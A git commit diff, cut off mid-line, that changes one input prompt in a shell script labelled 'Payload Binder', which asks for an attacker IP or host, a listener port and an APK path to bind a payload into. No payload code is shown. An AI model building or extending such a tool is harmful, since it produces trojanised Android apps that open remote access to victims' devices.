9e13ca73ef7af85816531f69534fcdfd80850f8a
WebDragon <117004849+webdragon63@users.noreply.github.com>
2025-02-03 19:43:25 +0000

    Update fun_b.sh

--- src/fun_b.sh
+++ src/fun_b.sh
@@ -3,7 +3,7 @@
 echo -e "\033[0;33m"
 echo "Executing the Payload Binder ..."
 echo -e "\033[0;36m"
-read -p "    Enter your IP Address ===> " ip
+read -p "    Enter your IP/Host Address ===> " ip
 read -p "    Enter listener port ===> " Port  
 read -p "    Enter main apk path ===> " a  
 read -p "|---Set the name and path to save the binded payload
